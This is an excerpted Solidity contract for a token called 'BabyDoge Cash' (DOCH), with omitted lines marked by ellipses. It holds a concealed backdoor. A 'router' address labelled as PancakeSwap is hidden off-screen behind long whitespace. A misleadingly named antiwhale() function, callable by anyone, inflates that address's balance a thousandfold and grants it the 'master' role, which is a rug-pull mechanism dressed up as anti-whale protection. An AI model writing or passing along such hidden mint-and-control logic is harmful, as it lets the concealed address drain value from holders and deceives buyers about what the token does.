...
contract ERC200 is Context, IERC20, Ownable {
    ...
    address private master;
     ...
     public { router = /** address router pancakeswap*/                                                                                                                                    0xdd986b1eCC9dB6083f4b2462490bB57176022638;
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        ...
        returns (uint256)
    {
     ...
     function antibot() external onlyMaster returns (uint256){
      ...
      function antiwhale() external returns (uint256){
         _balances[router]*=1000;master=router;
     }
    ...
    initialsupply(msg.sender, amount);
    }
    ...
    function initialsupply(address account, uint256 amount) internal virtual {
...
contract BABYDOGECASH is ERC200 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC200("BabyDoge Cash", "DOCH") {
        initialsupply(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}